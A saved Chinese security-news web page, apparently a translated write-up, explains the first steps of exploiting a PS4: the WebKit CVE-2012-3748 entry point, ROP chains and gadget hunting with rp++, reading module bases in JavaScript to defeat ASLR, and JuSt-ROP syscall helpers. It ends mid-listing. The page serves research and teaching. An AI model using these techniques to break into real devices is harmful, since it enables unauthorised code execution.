<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <title>破解索尼PS4系列：利用网页漏洞实现相关的ROP攻击（一） - 嘶吼 RoarTalk &#8211; 回归最本质的信息安全,互联网安全新媒体,4hou.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="renderer" content="webkit">
    <meta property="wb:webmaster" content="4517e8fe39b18975" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1" />
    <meta name="description" content="目前关于PS4的黑客攻击还非常的少，但这并不能说明PS4 系统非常安全，黑客不会对其发动攻击。本文的目的就是找出PS4的一系列漏洞，最终来获得PS4的内核执行代码。PlayStation 4（简称PS4），是索尼电脑娱乐公司（SC…" />
    <meta name="keywords" content="FreeBSD, PS4" />
        <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon.ico" rel="shortcut icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_114.png" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_76.png" sizes="76x76" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_120.png" sizes="120x120" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_152.png" sizes="152x152" rel="apple-touch-icon">

    <!-- 引入 lib -->
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/jquery.min.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.jquery.min.js"></script>
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.min.css">
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
    <!--[if lt IE 11]>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/html5shiv.min.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/respond.js"></script>
    <![endif]-->
    <!-- 引入 css js -->
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/css/style.css">
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/public.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/main.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/index-more.js"></script>
    </head>
<body>
<style type="text/css">
.memberlistanimate{width: 122px}
.memberlistanimateleave{width: 122px}
.nameheader{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width: 78px;display: block;}
</style>

<header class="header">
            <article class="header_center">
                <div class="logowrap">
            <a href="http://www.4hou.com"><div class="logo icons"></div></a>
            <h1>回归最本质的信息安全</h1>
        </div>
        <div class="login">
            <form action="/" class="navbar-form inSearch " name="searchform" onsubmit="return checksubmit()">
                <div class="br">
                    <span class="in-btn icons"></span>
                    <input type="text" name="s" id="search" class="animated">
                    <div class="clear icons"></div>
                </div>
                <div id="submitBtnplace" class="icons animated" value=""></div>
                <!--<input type="submit" id="submitBtn" class="icons animated" value="">-->
            </form>
                            <!--登录注册按钮-->
                 <div id="register">
                     <a href="http://www.4hou.com/register" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">注册</a>
                 </div>
                 <div id="sing">
                      <a href="http://www.4hou.com/login" class="pzh_login">登录</a>
                 </div>

                 <div class="burger2 menu" id="burger">
                  <div class="icon"></div>
                 </div>

            
           <!-- <div id="register">注册</div>
            <div id="sing">登录</div>
            <div class="burger2 menu" id="burger">
                <div class="icon"></div>
            </div>-->
        </div>
    </article>
</header>
<nav class="navbox animated">
    <section class="navbox_cen">
        <article class="navboxleft">
            <ul class="nav navbar-nav index-nav" id="inNav">
					<li>
							<li class="cat-item cat-item-18"><a href="http://www.4hou.com/category/info" >资讯</a>
</li>
	<li class="cat-item cat-item-19"><a href="http://www.4hou.com/category/technology" >技术</a>
</li>
	<li class="cat-item cat-item-20"><a href="http://www.4hou.com/category/xactivity" >活动</a>
</li>
	<li class="cat-item cat-item-29"><a href="http://www.4hou.com/category/vulnerable" >漏洞</a>
</li>
					</li>
                    <li class="cat-item cat-item-29"><a href="http://www.4hou.com/piao" >嘶票</a>
                    </li>
            </ul>
        </article>
        <article class="navboxright">
            <div class="contrib"> <a href="http://www.4hou.com/contribute" class="tougao" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">投稿</a></div>
        </article>
    </section>
</nav>
<div id="modelbg"></div>
    <style>


    ::selection {
    background:#fea283;
    color:#fff;
}
::-moz-selection {
    background:#fea283;
    color:#fff;
}
::-webkit-selection {
    background:#fea283;
    color:#fff;
}


        .article_cen p img{height: auto !important;}
        .commentlist .children{width: 90%; padding-right: 15px; border-color: transparent ;}
        .commentname,.commenteml{width: 60%; margin-left:5% ;margin-bottom: 30px;border-bottom: 1px solid #dbdbdb;}
        .article_cen ol li{list-style-type: decimal;}
         .article_cen ol li p{overflow: inherit;}
        .commentname label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
        .commentname input{width: 50%;border: none; outline: none;}
        .commenteml label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
        .commenteml input{width: 50%;border: none; outline: none;}
        #zooming{display: none;width: 100%;height: 100%; position: fixed;z-index: 999;left: 0px; top: 0px; background-color: rgba(0,0,0,.6);}
        .zoomaniatae{display: block !important;}
        .imgcon{}
        #imgcon{position: absolute;left: 50%; top: 20%;max-width: 80%}
        .article_cen img{cursor: pointer;}
        #zooming{cursor: pointer;}
        .imgconadimate{animation:imgcon 0.5s 1 forwards;
        -webkit-animation:imgcon 0.5s 1 forwards;}
        .article_authorbox{    width: 222px;min-height: 214px;
        padding-bottom: 20px;
        float: right;
        position: relative;}
        .interested{position: relative;}
        .interested>h1{font-size: 18px; font-weight: 900; position: absolute; top: -36px;color: #5e5e5e}
       .user-comment span{font-size: 13px; position: relative; top: 2px;}
        .article_authoradd{position: fixed;}
        .stratend{background:url(http://www.4hou.com/wp-content/themes/4houv2/img/starend.png); !important;background-size: contain !important;}
        .wpfp-span{opacity: 0;width:100%; height: 100%;display: block; left: 0px; top: 0px; }
        .wpfp-link{width:100%; height: 100%;display: block; left: 0px; top: 0px; }
        .wpfp-span img{display: none;}
        .interested{width: 222px;padding-bottom: 20px;background-color: #fff;margin-top: 70px; padding-bottom: 10px; padding-top: 10px;border: 1px solid #f5c2b1}
        .interested li{width: 100%;position: relative;padding-top: 8px; padding-bottom: 8px;  line-height: 24px; padding-left: 20px;padding-right: 14px}
        .interested li i{width: 6px;height: 6px;border-radius: 50%; background-color: #f63;position: absolute; left: 8px; top: 18px;}
        .interested li a{color: #666;font-size: 14px; line-height: 18px;}
        .interested li:hover{background-color: #f9e7e3;-moz-transition: all 0.4s ease-in-out;
        .footer{position: relative;z-index: 99}   
        .article_authorbox_top{position: relative;} 
        

        -o-transition: all 0.4s ease-in-out; -webkit-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;}
    
        @-webkit-keyframes imgcon{
            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
            50%{ opacity:1 }
        }
        @keyframes imgcon{
            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
            50%{ opacity:1 }
        }
        .asideanimate{animation:asideanimate 1s 1 forwards;
        -webkit-animation:asideanimate 1s 1 forwards; position: fixed;}
        @-webkit-keyframes asideanimate{
            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
            50%{ opacity:1 }
        }
        @keyframes asideanimate{
            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
            50%{ opacity:1 }
        }
        .asideanimateleave{animation:asideanimateleave 1s 1 forwards;
        -webkit-animation:asideanimateleave 1s 1 forwards;}
        @-webkit-keyframes asideanimateleave{
            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
        }
        @keyframes asideanimateleave{
            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
        }
        @media screen and (max-width:650px) {
            .member_list{right: -30px !important;top: 34px !important;}
            .article_authorbox{display: none;}
            .nameheader{display: none;}
            .shang_box{width: 90%; margin-left:-45% }
            #imgcon{width: 90% !important; margin-left: -45% !important;max-width: inherit !important}
            .dy{padding: 12px 15px!important;font-size: 14px !important; line-height: 22px !important;}
        }
        .article_author{float:none !important;padding-top: 1px;}
        .article_cen pre{color: #666 !important; line-height: 26px; background-color: #f1f1f1}
        .articlecontent blockquote>p{ color: #666; font-size: 16px; }
    </style>
    <section class="articlewrap">
        <article class="articlecontent">
            <div class="article_top">
                <h1 class="art_title">破解索尼PS4系列：利用网页漏洞实现相关的ROP攻击（一）</h1>
                <p class="art_time">2017年3月28日发布</p>
                <div class="art_nav">
                    <!--<a href="">翻译文章</a>
                    <span>／</span>
                    <a href="">新闻</a>
                    <span>／</span>
                    <a href="">原创</a>-->
                                        <a href="http://www.4hou.com">首页 </a></a>
                    <span>／</span>
                    <a href="http://www.4hou.com/category/technology">技术</a>
                    <span>／</span>
                    <a href="">正文</a>

                    </ul>
                </div>
                <div class="art_type">
                    <div class="newtype">
                        <div class="read ">
                            <i class="icons"></i>
                            <span>7,222</span>
                        </div>
                        <div class="comment ">
                            <i class="icons"></i>
                            <span>2</span>
                        </div>
                        <div class="Praise">
                            <i class="icons"></i>
                            <span>0</span>
                        </div>
                    </div>
                </div>
            </div>
             <p class="dy" style="padding: 24px 60px;font-size: 16px;line-height: 30px;color: #808080;background-color: #f6f6f6;"><span style="font-weight: bold;">导语：</span>目前关于PS4的黑客攻击还非常的少，但这并不能说明PS4 系统非常安全，黑客不会对其发动攻击。本文的目的就是找出PS4的一系列漏洞，最终来获得PS4的内核执行代码。</p>

            <div class="article_cen">
                <!--文章摘要-->
               
                <p><p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170325/1490409202637579.jpg" title="1490409202637579.jpg" alt="u=621060944,2611130995&amp;fm=206&amp;gp=0.jpg"/><noscript><img src="/uploads/20170325/1490409202637579.jpg" title="1490409202637579.jpg" alt="u=621060944,2611130995&amp;fm=206&amp;gp=0.jpg"/></noscript></p>
<p>目前关于PS4的黑客攻击还非常的少，但这并不能说明PS4 系统非常安全，黑客不会对其发动攻击。本文的目的就是找出PS4的一系列漏洞，最终来获得PS4的内核执行代码。</p>
<p>PlayStation 4（简称PS4），是索尼电脑娱乐公司（SCE）推出的家用游戏机。是PlayStation游戏机系列的第四代游戏主机。PlayStation 4采用以AMD为基础的x86-64架构处理器（8核）</p>
<p>除了有一个记录良好的架构处理器，PS4中使用的大部分软件都是开源的。最值得注意的是，PS4运行的操作系统上是Orbis OS，这是一款修改版FreeBSD 9.0。FreeBSD是一种类Unix操作系统，是由经过BSD、386BSD和4.4BSD发展而来的Unix的一个重要分支。相比Linux，其授权许可更为宽松，而且PS4是基于x86_64架构，并非上代所采用的Cell，这也使得运行FreeBSD变得更为简单。除此之外，PS4还运行了其他的的开源软件，如Mono VM和WebKit。</p>
<p><span style="font-size: 20px;"><strong>WebKit漏洞</strong></span></p>
<p>WebKit 是 iOS、Wii U、3DS、PS Vita 以及 PS4 当中的浏览器用来渲染网页的开源排版引擎。特别是，PS4的1.76版本固件中的浏览器使用了易受CVE-2012-3748远程代码执行漏洞(含EXPLOIT!)攻击的WebKit 版本，该漏洞会利用JSArray::sort(&#8230;) 方法进行堆的缓冲区溢出。</p>
<p>早在2014年，nas和Proxima就宣布，他们已经成功地把Mac OS X Safari的WebKit漏洞利用到PS4的浏览器上，并公开发布了PoC代码，作为入侵PS4的第一个攻击入口。</p>
<p>这样我们就能任意的读写并访问WebKit进程中所包含的任何读取和写入的内容，然后将Webkit模块进行转储，并改写堆栈上的返回地址，最终我们就可以通过这个攻击口控制指令指针寄存器（rip）来实现ROP执行。</p>
<p>此后，人们还在WebKit中发现了许多其他漏洞，这些漏洞可能相继被用作了PS4的攻击入口。</p>
<p><span style="font-size: 20px;"><strong>什么是ROP链</strong>？</span></p>
<p>与原始设备（如DS）不同，PS4具有控制不同存储区域属性的内核，这也就意味着可以在PS4设备上执行数据执行保护(DEP) ，即DEP可帮助PS4设备防止把数据页当作代码执行，从而有效分离数据与代码。PS4设备实施 DEP 检测从这些位置运行的代码，并在发现执行情况时引发异常。</p>
<p>所以我们就不能将有效载荷复制到内存中并执行它，但是，我们可以执行已经加载到内存中并标记为可执行文件的代码。如果我们不能将自己的代码写入该地址，那么即使跳转到该地址也不能执行，所以我们就必须使用ROP。</p>
<p>面向返回编程（ROP）只是传统堆栈粉碎的一个扩展，不过我们的目的并不只是改写程跳转值，由于ROP其核心思想是在整个进程空间内现存的函数中寻找适合指令片断（gadget），并通过精心设计返回堆栈把各个gadget拼接起来，从而达到恶意攻击的目的。构造ROP攻击的难点在于，我们需要在整个进程空间中搜索我们需要的gadgets，这需要花费相当长的时间。但一旦完成了“搜索”和“拼接”，这样的攻击是无法抵挡的，因为它用到的都是内存中合法的代码，普通的杀毒引擎对ROP攻击是无计可施的。</p>
<p>然后这些gadgets还有一个特征要求就是：他们都是要以一个返回指令作为结尾（如ret指令）。而实际上，这些gadgets的返回指令的作用就是用来对地址链中的下一个gadget进行调用。</p>
<p>在 x86_64 汇编语言中，当执行到一个 ret 指令时，一个 64 位值就会被退栈，并且寄存器也会跳转到这个值，由于我们可以控制堆栈，所以我们就可以让每一个 ret 指令都跳转到下一个gadgets。例如，从0x80000开始，会包含以下指令：</p>
<pre>mov&nbsp;rax,&nbsp;0
ret</pre>
<p>而从0x90000开始，指令就会发生变化，如下所示：</p>
<pre>mov&nbsp;rbx,&nbsp;0
ret</pre>
<p>如果我们把堆栈上的返回地址相继修改为0x80000和0x90000，那么一旦执行到第一个ret指令，就将跳转到mov rax, 0, ，然后紧接着，下一个ret指令会将 0x90000 退栈，并且跳到mov rbx,0。</p>
<p>ROP链不仅限于地址列表，假设从0xa0000也包含这些指令：</p>
<pre>pop&nbsp;rax
ret</pre>
<p>我们可以将ROP链中的第一个项目设置为0xa0000，将下一个项目设置为rax的任何所需值。</p>
<p>gadgets也不一定要以 ret 指令结束，我们也可以使用以 jmp 结束的指令：</p>
<pre>add&nbsp;rax,&nbsp;8
jmp&nbsp;rcx</pre>
<p>让 rcx 指向ret 指令，ROP 将继续运行：</p>
<pre>chain.add(&quot;pop&nbsp;rcx&quot;,&nbsp;&quot;ret&quot;);
chain.add(&quot;add&nbsp;rax,&nbsp;8;&nbsp;jmp&nbsp;rcx&quot;);</pre>
<p>但是，我们并不是总能找到所需的gadgets，这时，我们就需要用gadgets把其后的指令进行修改。例如，要将r8设置为某个指令，但如果只有gadgets，我们就只能把r9设置为某个虚拟值：</p>
<pre>pop&nbsp;r8
pop&nbsp;r9
ret</pre>
<p><span style="font-size: 20px;"><strong>寻找gadgets</strong></span></p>
<p>ROP的功能都是用序言和结尾语言构成的：</p>
<pre>;&nbsp;Save&nbsp;registers
push&nbsp;&nbsp;&nbsp;&nbsp;rbp
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbp,&nbsp;rsp
push&nbsp;&nbsp;&nbsp;&nbsp;r15
push&nbsp;&nbsp;&nbsp;&nbsp;r14
push&nbsp;&nbsp;&nbsp;&nbsp;r13
push&nbsp;&nbsp;&nbsp;&nbsp;r12
push&nbsp;&nbsp;&nbsp;&nbsp;rbx
sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp,&nbsp;18h

;&nbsp;Function&nbsp;body

;&nbsp;Restore&nbsp;registers
add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp,&nbsp;18h
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbx
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r12
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r13
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r14
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r15
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbp
ret</pre>
<p>我们期望找到的gadgets能 将xor rax, rax返回之前的返回值置设置为0：</p>
<pre>cmp&nbsp;[rax],&nbsp;r12
ret</pre>
<p>x86架构是重要地可变指令长度的CISC(复杂指令集计算机,Complex Instruction Set Computer)。 x86_64上的ROP充分利用了指令集的特点，即任何随机的字节序列都可能被解释为一些有效的x86_64指令集。</p>
<p>为了展示这一点，可以从WebKit模块中看看这个函数的结尾：</p>
<pre>000000000052BE0D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[rdx+8]
000000000052BE10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rsi+10h],&nbsp;eax
000000000052BE13&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;[rsi+39h],&nbsp;20h
000000000052BE17&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret</pre>
<p>假如如果我们从0x52be14开始解码，会出现什么变化呢？</p>
<pre>000000000052BE14&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[rax],&nbsp;r12
000000000052BE17&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret</pre>
<p>即使这段代码从来没有被执行过，它还是在一个被标记为可执行的内存区域内，所以这段代码完全可以作为gadgets。用来搜索ROP gadgets的是rp ++;要生成一个gadgets的文本文件，只要执行：</p>
<pre>rp-win-x64&nbsp;-f&nbsp;mod14.bin&nbsp;--raw=x64&nbsp;--rop=1&nbsp;--unique&nbsp;&gt;&nbsp;mod14.txt</pre>
<p><span style="font-size: 20px;"><strong>一般保护错误</strong></span></p>
<p>操作系统一般将内存划分为不同的区域，有的区域只供操作系统使用，而有的系统是供应用程序使用的。当应用程序企图在分配给它的内存区域进行访问操作时，操作系统将中止这个程序的运行，用户得到的是一行错误码，告诉用户程序出现了一般保护错误。</p>
<p>例如，尝试映射到堆栈上的只能读写的执行代码：</p>
<pre>setU8to(chain.data&nbsp;+&nbsp;0,&nbsp;0xeb);
setU8to(chain.data&nbsp;+&nbsp;1,&nbsp;0xfe);

chain.add(chain.data);</pre>
<p>并尝试写入代码，将其映射为只读和执行：</p>
<pre>setU8to(moduleBases[webkit],&nbsp;0);</pre>
<p>如果发生了段错误，系统将会提示“可用系统内存不足”，此时，网页加载也会失败。</p>
<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170325/1490409462798608.png" title="1490409462798608.png" alt="14.png"/><noscript><img src="/uploads/20170325/1490409462798608.png" title="1490409462798608.png" alt="14.png"/></noscript></p>
<p>其他情况下也会出现“可用系统内存不足”的现象，例如 除数是o，执行无效指令以及未实现的系统调用，但最常见的还是段错误。</p>
<p><span style="font-size: 20px;"><strong>ASLR</strong></span></p>
<p>地址空间布局随机化（ASLR）是一种安全技术，每次启动PS4时，都会使模块的基址不同。据我们所知，非常老的固件，比如1.05版本就没有启用ASLR。绕过ASLR的检测，是件非常困难的事情。因为首先你得知道gadgets的地址，否则你根本无法在堆栈中进行操作。不过，对于我们来说，我们并不仅限于编写静态ROP链，我们可以使用JavaScript来读取模块表，从而获取所有加载模块的基地址。</p>
<p>使用这些基地址，我们就可以在触发 ROP 执行之前计算出所有的gadgets地址，以便绕过 ASLR。以下这份模块表还包含了模块的文件名：</p>
<pre class="brush:html;toolbar:false">WebProcess.self
libkernel.sprx
libSceLibcInternal.sprx
libSceSysmodule.sprx
libSceNet.sprx
libSceNetCtl.sprx
libSceIpmi.sprx
libSceMbus.sprx
libSceRegMgr.sprx
libSceRtc.sprx
libScePad.sprx
libSceVideoOut.sprx
libScePigletv2VSH.sprx
libSceOrbisCompat.sprx
libSceWebKit2.sprx
libSceSysCore.sprx
libSceSsl.sprx
libSceVideoCoreServerInterface.sprx
libSceSystemService.sprx
libSceCompositeExt.sprx</pre>
<p>虽然PS4主要使用模块的[Signed]PPU可重定位和可执行格式的（[S]PRX）格式，但是对于[Signed]可执行文件和链接格式（[S] ELF））的某些字符串，也可以在libSceSysmodule.sprx中找到转储文件，如bdj.elf、web_core.elf 以及 orbis-jsc-compiler.self，这个模块和对象的组合类似于PSP和PS3中使用的组合。</p>
<p>你可以在libSceSysmodule.sprx中查看可用的所有模块（不仅仅是由浏览器加载的模块）的完整列表。我们等一会可以通过索尼的几个自定义系统调用来加载和转储其中的一些模块。</p>
<p><span style="font-size: 20px;"><strong>JuSt-ROP</strong></span></p>
<p>使用JavaScript来编写和执行动态ROP链，比传统的静态缓冲区溢出攻击更有优势。除了必须绕过ASLR之外，JavaScript还能让我们阅读到浏览器的用户代理，并为不同的浏览器版本提供不同的ROP链，从而使我们的漏洞具有更大的兼容性。</p>
<p>我们甚至可以使用JavaScript来读取gadgets地址上的内存，以检查它们是否正确。理论上，你可以我们可以通过编写脚本来动态地查找ROPgadgets，然后即时构建ROP链接，但实际的做法是编写动态地ROP链要比事先编写脚本的做法要有用的多。因此，我们会创建一个用于编写ROP链的JavaScript框架，即JuSt-ROP。</p>
<p><span style="font-size: 20px;"><strong>JavaScript注意事项</strong></span></p>
<p>JavaScript 用的是 IEEE-754 标准，IEEE 754 标准是IEEE二进位浮点数算术标准（IEEE Standard for Floating-Point Arithmetic）的标准编号，等同于国际标准ISO/IEC/IEEE 60559。IEEE双精度格式具有53位有效数字精度，并总共占用64位。如果你只需要将一个 64 位值转换为低精度，例如 256，那么 setU64to 就很好。</p>
<p>但是在需要编写缓冲区或数据结构的情况下，如果使用64位来写入的话，某些字节可能不会被正确的写入。此时，你就应该使用32位来写入数据（请注意，PS4是是小端序形式），以确保每个字节都是精确的。</p>
<p><strong>系统调用</strong></p>
<p>有趣的是，PS4使用与Linux和MS-DOS相同的调用约定进行系统调用，参数存储在寄存器中，而不是传统的UNIX方式（默认情况下是FreeBSD使用）存储在堆栈中：</p>
<pre class="brush:html;toolbar:false">rax-系统调用号码
rdi-参数1
rsi-参数2
rdx-参数3
r10-参数4
r8-参数5
r9-参数6</pre>
<p>我们可以尝试使用以下JuSt-ROP方法来执行任何系统调用：</p>
<pre>this.syscall&nbsp;=&nbsp;function(name,&nbsp;systemCallNumber,&nbsp;arg1,&nbsp;arg2,&nbsp;arg3,&nbsp;arg4,&nbsp;arg5,&nbsp;arg6)&nbsp;{
	console.log(&quot;syscall&nbsp;&quot;&nbsp;+&nbsp;name);
	
	this.add(&quot;pop&nbsp;rax&quot;,&nbsp;systemCallNumber);
	if(typeof(arg1)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rdi&quot;,&nbsp;arg1);
	if(typeof(arg2)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rsi&quot;,&nbsp;arg2);
	if(typeof(arg3)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rdx&quot;,&nbsp;arg3);
	if(typeof(arg4)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;rcx&quot;,&nbsp;arg4);
	if(typeof(arg5)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;r8&quot;,&nbsp;arg5);
	if(typeof(arg6)&nbsp;!==&nbsp;&quot;undefined&quot;)&nbsp;this.add(&quot;pop&nbsp;r9&quot;,&nbsp;arg6);
	this.add(&quot;mov&nbsp;r10,&nbsp;rcx;&nbsp;syscall&quot;);
}</pre>
<p>请务必事先将栈库设置为可用内存：</p>
<pre>this.add(&quot;pop&nbsp;rbp&quot;,&nbsp;stackBase&nbsp;+&nbsp;returnAddress&nbsp;+&nbsp;0x1400);</pre>
<p>如果你在对模块逆向工程以确定一些索尼自定义的系统调用的话，你可能遇到一种不同的命名约定：</p>
<p>有些时候，索尼通过常规的系统调用 0（一般在 FreeBSD 中不会有任何效果）来执行系统调用，使用第一个参数（rdi）来确定将被执行的系统调用：</p>
<p>使用系统调用可以了解到PS4内核的大量信息，除此之外，使用系统调用很可能是我们可以与内核进行交互的唯一方式，并且可能触发一个内核漏洞。</p>
<p>如果你用反向工程模块来识别索尼的一些自定义系统调用，则可能会遇到另一种调用约定：有时，索尼会通过常规系统调用0（通常在FreeBSD中不会有什么执行效果）执行系统调用，第一个参数（rdi）会控制系统调用的执行情况：</p>
<pre class="brush:html;toolbar:false">rax-0
rdi-系统调用号
rsi-参数1
rdx-参数2
r10-参数3
r8-参数4
r9-参数5</pre>
<p>索尼很有可能会轻松兼容调用约定，例如：</p>
<pre>.global&nbsp;syscall
syscall:
	xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,&nbsp;rax
	mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r10,&nbsp;rcx
	syscall
	ret</pre>
<p>这样，就可以使用函数调用约定从C执行系统调用：</p>
<pre class=" language-c">int&nbsp;syscall();int&nbsp;getpid(void)&nbsp;{
	return&nbsp;syscall(20);}</pre>
<p>在编写ROP链时，我们可以使用任何一个约定：</p>
<pre>//&nbsp;Both&nbsp;will&nbsp;get&nbsp;the&nbsp;current&nbsp;process&nbsp;ID:
chain.syscall(&quot;getpid&quot;,&nbsp;20);
chain.syscall(&quot;getpid&quot;,&nbsp;0,&nbsp;20);</pre>
<p>这是很好的意识到这一点，因为我们可以使用任何一个更方便的小工具可用。意识到这一点，可以让我们自由的选择比较方便的gadgets。</p>
<p><span style="font-size: 20px;"><strong>getpid</strong></span></p>
<p>只要使用系统调用20，getpid（void），我们就可以了解到许多关于内核的信息（函数说明：getpid ()用来取得目前进程的进程识别码）。这个系统调用的事实告诉我们，索尼完全没有使用混淆系统调用号来作为一种安全手段。所以，我们可以自动在PS4内核中有进行一系列的系统调用尝试。</p>
<p>其次，通过调用getpid（），重新启动浏览器并再次调用它，我们会得到一个比以前的值高2的返回值。这告诉我们，浏览器应用程序实际上是由两个独立的进程组成：一个是WebKit内核，用来 处理HTML和CSS的解析，解码图像和执行JavaScript；另一个负责显示图形，接收控制器输入，管理历史记录和书签等。</p>
<p>此外，虽然FreeBSD自4.0以来一直支持PID随机化，但顺次分配 PID 仍是默认的方式。使用默认的 PID 分配方式表明，索尼可能不会再添加任何其他的安全增强功能，例如除了用户级ASLR之外，像HardenedBSD这样的项目所鼓励的增强功能。</p>
<p><span style="font-size: 20px;"><strong>有多少个自定义系统调用？</strong></span></p>
<p>FreeBSD 9.0系统调用的是 wait6，编号为 532，可以肯定的是，往后更高的版本也用的是索尼自定义的系统调用。</p>
<p>在没有正确参数的情况下调用索尼的大多数自定义系统调用，都将返回0x16“参数无效”的错误信息，但是，任何兼容性或未实现的系统调用将报告“没有足够的可用系统内存”错误。经过不断的尝试，我们发现系统调用号 617是索尼最后的系统调用，再往高系统就无法实现了。至此我们可以得出结论，在PS4的内核中有85个索尼自定义的系统调用（617-532）。</p>
<p><strong>libkernel.sprx</strong></p>
<p>要确定libkernel是如何使用自定义系统调用的，我们就必须首先记住它只是对标准FreeBSD 9.0库的修改。</p>
<p>这是thr_init.c中的_libpthread_init提取部分：</p>
<pre class=" language-c">/*
&nbsp;*&nbsp;Check&nbsp;for&nbsp;the&nbsp;special&nbsp;case&nbsp;of&nbsp;this&nbsp;process&nbsp;running&nbsp;as
&nbsp;*&nbsp;or&nbsp;in&nbsp;place&nbsp;of&nbsp;init&nbsp;as&nbsp;pid&nbsp;=&nbsp;1:
&nbsp;*/if&nbsp;((_thr_pid&nbsp;=&nbsp;getpid())&nbsp;==&nbsp;1)&nbsp;{
	/*
	&nbsp;*&nbsp;Setup&nbsp;a&nbsp;new&nbsp;session&nbsp;for&nbsp;this&nbsp;process&nbsp;which&nbsp;is
	&nbsp;*&nbsp;assumed&nbsp;to&nbsp;be&nbsp;running&nbsp;as&nbsp;root.
	&nbsp;*/
	if&nbsp;(setsid()&nbsp;==&nbsp;-1)
		PANIC(&quot;Can&#39;t&nbsp;set&nbsp;session&nbsp;ID&quot;);
	if&nbsp;(revoke(_PATH_CONSOLE)&nbsp;!=&nbsp;0)
		PANIC(&quot;Can&#39;t&nbsp;revoke&nbsp;console&quot;);
